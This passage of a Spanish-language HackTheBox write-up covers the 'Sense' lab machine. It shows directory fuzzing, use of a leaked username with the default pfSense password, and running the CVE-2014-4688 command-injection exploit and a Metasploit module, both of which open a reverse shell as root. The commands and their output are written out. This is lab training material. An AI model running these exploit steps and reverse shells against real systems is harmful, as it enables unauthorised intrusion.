+</span></span><span style="display:flex;"><span>/shortcuts            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/shortcuts/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/installer            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/installer/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wizards              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/wizards/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/csrf                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/csrf/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/filebrowser          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/filebrowser/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/%7Echeckout%7E       <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 345<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">220555</span> / <span style="color:#ae81ff">220561</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-k</em></td>
+					<td>Para indicar que se deshabilite la comprobación de certificados</td>
+			</tr>
+	</tbody>
+</table>
+<p>Excelente, veo 2 directorios interesantes que son <strong>installer</strong> y <strong>tree</strong>, pero <strong>installer</strong> no servirá de mucho porque no nos muestra nada, así que vamos directamente con <strong>tree</strong>:</p>
+<p><img src="/assets/images/htb-writeup-sense/Captura5.png" alt=""></p>
+<p><strong>SilverStripe</strong> parece ser un servicio, vamos a investigarlo:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Servicio SilverStripe</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>SilverStripe es un sistema de gestión de contenidos (CMS) basado en PHP que presenta una agradable y moderna interfaz de usuario y simplifica bastante la construcción de un sitio web profesional. SilverStripe es una herramienta gratuita que nos permite crear y administrar sitios web a través de una interfaz muy limpia y sencilla de utilizar. Se pueden crear menús y apartados de forma rápida e intuitiva, así como añadir contenidos (texto, imágenes, archivos …).</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Entonces, el <strong>servicio SilverStripe</strong> es un gestor de archivos de texto, fotos, etc., que se me hace que podemos listar esos archivos especificándolos en el <strong>Fuzzing</strong>, vamos a buscar si existen archivos de texto.</p>
+<h3 id="Fuzz2">Buscando Archivos de Texto con Fuzzing</h3>
+<p>Vamos a intentarlo con <strong>wfuzz</strong> y luego con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -L -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.60/FUZZ.txt/
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.10.60/FUZZ.txt/
+</span></span><span style="display:flex;"><span>Total requests: 220560
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                     
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000001268:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">40</span> W       <span style="color:#ae81ff">271</span> Ch      <span style="color:#e6db74">&#34;changelog&#34;</span>                                                                 
+</span></span><span style="display:flex;"><span>000120222:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">6</span> L      <span style="color:#ae81ff">12</span> W       <span style="color:#ae81ff">106</span> Ch      <span style="color:#e6db74">&#34;system-users&#34;</span>                                                              
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 1952.265
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">220560</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">220545</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 112.9764
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-L</em></td>
+					<td>Para que wfuzz siga las redirecciones que surjan en el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Excelente, ahora tratemos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">20</span> -k -x txt,php,conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.5
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://10.10.10.60/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,php,conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/help.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/themes               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/themes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/stats.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/edit.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/includes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/license.php          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6692<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/system.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/status.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/javascript           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/javascript/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/changelog.txt        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 271<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/classes              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/classes/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/exec.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/widgets              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/widgets/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/graph.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/tree                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/tree/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wizard.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/shortcuts            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/shortcuts/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/pkg.php              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6688<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/installer            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/installer/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/wizards              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/wizards/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/xmlrpc.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 384<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/reboot.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/interfaces.php       <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6695<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/csrf                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/csrf/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/system-users.txt     <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 106<span style="color:#f92672">]</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-k</em></td>
+					<td>Para indicar que se deshabilite la comprobación de certificados.</td>
+			</tr>
+			<tr>
+					<td><em>-x</em></td>
+					<td>Para especificar las extensiones de archivos que va a buscar durante el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Aparece un archivo llamado <strong>Changelog</strong>, veamos si podemos verlo:</p>
+<p><img src="/assets/images/htb-writeup-sense/Captura6.png" alt=""></p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Traducción</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Hubo un fallo al actualizar el Firewall, es necesario un parcheo manual. Se han mitigado 2 de 3 vulnerabilidades, los parches faltantes, serán puestos en la siguiente ventana de mantenimiento.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Después de leer el mensaje que nos apareció, sabemos que hay una vulnerabilidad que aún no han parchado.</p>
+<p>Bien, pero lo que nos interesa ahorita, es saber si podemos acceder a la página web para poder obtener la versión del <strong>pfSense</strong> y con eso podamos usar un Exploit.</p>
+<p>Aunque tambien podemos buscar un Exploit para el <strong>servicio SilverStripe</strong>. Pero, vamos a ver el otro archivo que se encontró, el <strong>system-users</strong>.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura7.png">
+</p>
+<p>Muy bien, ya tenemos un usuario y está usando la contraseña por defecto del <strong>servicio pfSense</strong>, intentemos entrar:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura8.png">
+</p>
+<p>¡Excelente! Ya estamos dentro:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-sense/Captura9.png">
+</p>
+<p>Ahí está la versión del <strong>pfSense</strong>, ahora podemos buscar un Exploit para este servicio.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="PruebaExp">Buscando un Exploit para pfSense</h3>
+<p>Como ya encontramos la versión de <strong>pfSense</strong> que está ocupando la máquina víctima, vamos a buscar un Exploit adecuado que nos ayude a acceder a la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit pfsense 2.1.3                                                                               
+</span></span><span style="display:flex;"><span>----------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                             |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>pfSense &lt; 2.1.4 - <span style="color:#e6db74">&#39;status_rrd_graph_img.php&#39;</span> Command Injection                                             | php/webapps/43560.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>Solo nos aparece un Exploit, así que vamos a analizarlo para ver cómo usarlo contra la máquina.</p>
+<h4 id="PruebaExp2">Probando Exploit: pfSense &lt; 2.1.4 - &lsquo;status_rrd_graph_img.php&rsquo; Command Injection</h4>
+<p>Copia el Exploit en tu espacio de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m php/webapps/43560.py 
+</span></span><span style="display:flex;"><span>  Exploit: pfSense &lt; 2.1.4 - <span style="color:#e6db74">&#39;status_rrd_graph_img.php&#39;</span> Command Injection
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/43560
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
+</span></span><span style="display:flex;"><span>    Codes: CVE-2014-4688
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: Python script, ASCII text executable
+</span></span></code></pre></div><p>Después de ver el contenido del Exploit, nos pide los siguientes parámetros:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rhost <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>rhost
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>lhost
+</span></span><span style="display:flex;"><span>lport <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>lport
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>username
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>password
+</span></span></code></pre></div><p>Incluso si lo ejecutamos, nos dirá como usarlo pues ya tiene permisos de ejecución:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./PFSense_Exploit.py -h
+</span></span><span style="display:flex;"><span>usage: PFSense_Exploit.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--rhost RHOST<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--lhost LHOST<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--lport LPORT<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--username USERNAME<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--password PASSWORD<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>options:
+</span></span><span style="display:flex;"><span>  -h, --help           show this help message and exit
+</span></span><span style="display:flex;"><span>  --rhost RHOST        Remote Host
+</span></span><span style="display:flex;"><span>  --lhost LHOST        Local Host listener
+</span></span><span style="display:flex;"><span>  --lport LPORT        Local Port listener
+</span></span><span style="display:flex;"><span>  --username USERNAME  pfsense Username
+</span></span><span style="display:flex;"><span>  --password PASSWORD  pfsense Password
+</span></span></code></pre></div><p>Muy bien, pongamos lo que pide y activémoslo.</p>
+<p>Hagamoslo por pasos:</p>
+<ul>
+<li>Activamos una <strong>netcat</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>                                  
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Usamos el Exploit:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./PFSense_Exploit.py --rhost 10.10.10.60 --lhost Tu_IP --lport <span style="color:#ae81ff">443</span> --username rohit --password pfsense
+</span></span></code></pre></div><ul>
+<li>Resultado:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>                                  
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.60<span style="color:#f92672">]</span> <span style="color:#ae81ff">46858</span>
+</span></span><span style="display:flex;"><span>sh: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Excelente, este Exploit nos conecta directamente como <strong>usuario root</strong>.</p>
+<h3 id="PruebaExp3">Ganando Acceso con Metasploit Framework</h3>
+<p>Esta parte es muy simple, pues vamos a utilizar el mismo Exploit, pero en <strong>Metasploit</strong>.</p>
+<p>Vamos por pasos:</p>
+<ul>
+<li>Inicia <strong>Metasploit</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
+</span></span></code></pre></div><ul>
+<li>Busca un Exploit para <strong>pfSense</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; search pfsense
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                            Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                            ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     No     Clickjacking Vulnerability In CSRF Error Page pfSense
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  exploit/unix/http/pfsense_diag_routes_webshell  2022-02-23       excellent  Yes    pfSense Diag Routes Web Shell Upload
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  No     pfSense authenticated graph status RCE
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>  exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  Yes    pfSense authenticated group member RCE
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>  exploit/unix/http/pfsense_pfblockerng_webshell  2022-09-05       excellent  Yes    pfSense plugin pfBlockerNG unauthenticated RCE as root
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 4, use <span style="color:#ae81ff">4</span> or use exploit/unix/http/pfsense_pfblockerng_webshell
+</span></span></code></pre></div><ul>
+<li>Usa el módulo número 2:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/unix/http/pfsense_graph_injection_exec
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload php/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><ul>
+<li>Configura el módulo:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.10.60
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.10.60
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#f92672">)</span> &gt; set LHOST Tu_IP
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; Tu_IP
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#f92672">)</span> &gt; set USERNAME rohit
+</span></span><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span>&gt; rohit
+</span></span></code></pre></div><ul>
+<li>Ejecuta el módulo:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected pfSense 2.1.3-RELEASE, uploading intial payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Payload uploaded successfully, executing
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">39927</span> bytes<span style="color:#f92672">)</span> to 10.10.10.60
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted jMWBmhjO
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>Tu_IP:4444 -&gt; 10.10.10.60:45246<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>.
